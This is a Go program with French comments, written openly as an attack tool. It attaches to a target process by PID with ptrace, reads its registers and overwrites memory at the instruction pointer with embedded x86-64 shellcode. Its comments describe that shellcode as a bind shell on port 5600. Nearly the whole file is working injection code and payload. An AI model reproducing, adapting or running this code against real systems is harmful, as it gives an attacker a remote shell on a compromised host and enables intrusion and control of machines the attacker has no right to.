package main

import (
	"syscall"
	"strconv"
	"fmt"
	"os"
)

func WriteToProcessMemory(s_pid string) {
	var registers syscall.PtraceRegs
	pid, errno := strconv.Atoi(s_pid)
	if errno != nil {
		fmt.Printf("Failed to convert string to int\n")
		return
	}

	err := syscall.PtraceAttach(pid) // S'attacher au processus avec la CAP_SYS_PTRACE
	if err != nil {
		fmt.Printf("[-] Failed to attach\n")
		return
	}

	fmt.Printf("[+] Attaching to process\n")

	//Attendre que le SE renvoie un signal au processus de se stopper sinon on pourrait lire les registres
	//avant que le processus ne soit complètement stoppé
	syscall.Wait4(pid, nil, 0, nil)


	err = syscall.PtraceGetRegs(pid, &registers) // Lecture des registres du processus
	if err != nil {
		fmt.Printf("[-] Cannot read registers\n")
		return
	}

	fmt.Printf("[+] Reading process registers\n")

	//Ecrire dans la mémoire du processus, on écrit avec des sauts de 8 octets car ptrace ne peut lire que 8 octets
	//Bind shell -> port 5600
	payload := []byte("\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05")
	i := 0
	payloadSize := len(payload)


	fmt.Printf("[*] Instruction pointer -> 0x%x\n", registers.Rip)
	fmt.Printf("[*] Shellcode injection... \n")

	var next_addr uint64
	var previous_bytes int
	var next_bytes int
	next_bytes = 0
	for i < (payloadSize / 8) {
		next_bytes = next_bytes + 8
		previous_bytes = next_bytes - 8
		next_addr = registers.Rip + uint64((i * 8))
		_, err = syscall.PtracePokeData(pid, uintptr(next_addr), payload[previous_bytes:next_bytes])
		if err != nil {
			fmt.Printf("[-] Cannot write in process memory\n")
		}
		i = i + 1
	}

	//Récupérer les octets restants de la payload pour en injecter la totalité en mémoire
	//On va venir chercher le reste en réalisant l'opération (taille de la payload / 8)
	remaining_bytes := payloadSize % 8
	if remaining_bytes != 0 {
		next_addr = registers.Rip + uint64((i * 8))
		previous_bytes = next_bytes
		next_bytes = next_bytes + remaining_bytes
		_, err = syscall.PtracePokeData(pid, uintptr(next_addr), payload[previous_bytes:next_bytes])
		if err != nil {
			fmt.Printf("[-] Cannot write in process memory\n")
		}
	}

	//Reprendre l'exécution du processus
	//syscall.PtraceCont(pid, 0)

	//Se détacher du processus
	fmt.Printf("[*] Detaching from process...\n")
	err = syscall.PtraceDetach(pid)
	if err != nil {
		fmt.Printf("[-] Cannot detach\n")
		return
	}

	fmt.Printf("[+] Successful injection listen on 0.0.0.0:5600\n")

}

func main() {
	pid := os.Args[1]	
	WriteToProcessMemory(pid)
}
